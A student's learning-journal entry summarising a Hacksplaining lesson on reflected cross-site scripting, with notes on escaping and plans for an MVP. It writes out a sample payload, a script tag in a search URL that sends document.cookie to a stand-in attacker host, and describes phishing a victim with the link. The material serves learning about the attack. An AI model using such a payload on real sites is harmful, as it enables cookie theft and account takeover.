# Entry #6: Another Part of XSS and Needing To Speed Things up
Time is running out and there is still so many more topics to learn about! What should I do? Read on to find out! (O u O)/

##### Some Side Notes: 
If you would like to follow along with what you will read in my entry, click on this link: [Hacksplaining: Reflected XSS](https://www.hacksplaining.com/exercises/xss-reflected#). 

When you click on the link, you will notice that there are circles on the top-left corner. Those circles are like the steps or slides of a presentation. You can click on them to go back and forward.  

![circles](../images/reflected-xss/circles.png)  

## Connection 
**_(circles 1+2)_**

This topic is connected to cross-site scripting, which gives attackers a way to use malicious JavaScript in programmer’s database. By doing so, the code is executed when user goes to site  
Another method of attackers using XSS to use malicious JavaScript → Reflected XSS attack  

## How It Happens 
**_(circle 3)_**

If a website uses HTTP to execute user’s request and show the results in return → opening a way for attackers to use their JavaScript on it. 

**_(circle 4-11)_**

* Mal (attacker) sees that a website uses the aspect of putting search terms into the URL. 
* Mal knows that search terms will be shown in the URL of the results page → www.welp.com?search=taco (```taco``` is the parameter value for ```search```)  
* Mal tries to infiltrate the site by making a URL with a section of JavaScript that can help him → ```www.welp.com?search=<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>``` (in parameter of search )    
* URL and his JavaScript runs → leading to his browser going to his malicious site 
* Once he was able to be successful, his next step would be to fool someone else to do what he just did, but without knowing that it is not suppose to happen in his favor 
* 
**Steps That Mal Takes:** 
1) Send email to Vic (innocent user) in attempt to have him click on the link that catches his attention 
2) Link clicked → page process the HTML “without escaping it properly” and instead, have it process the script tag that Mal injected 
    * “without escaping it properly” → Have the code language not transition into another one
        * Mr. Mueller’s example: ```<p> <%  > </p> ``` 
        * The ```>``` for the Ruby section (```<% >```)  
            * Without % → goes from HTML to Ruby and then back to HTML, but the closing tag for Ruby stays the same as the HTML one → letting Mal’s code run in browser  
3) Once page loads, Mal’s script is ran → leading Vic’s browser to show Mal’s malicious site instead  
    * Mal gains the ability to see Vic’s server log 

## Takeaways
**Use the people around you as resources.** For me, when I was learning about the method Mal would use so that the program is tricked into reading his malicious code, I was confused by the phrase, “escaping properly”. While knowing that Mr. Mueller has encountered this kind of obstacle before (with a link/URL), I went ahead and asked him to see if he understood what it means. It is kind of awesome that one’s struggle and success in something can lead to another person successfully tackle their own obstacle(s). 

## Next Steps 
* There are many more topics that I can learn about in this website, but time running out. What should I do? Well, from skimming through the topic names, I have noticed that cross-site scripting (XSS) is mentioned four times: Cross-Site Scripting, Cross-Site Request Forgery, Reflected XSS, and DOM-Based XSS. With these things in mind, my plan for now would be to learn the “last part” of XSS and then see if I I can make a MVP.  
* **MAKE A MVP BY _NEXT WEEK_!!!**  
* MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP MVP   





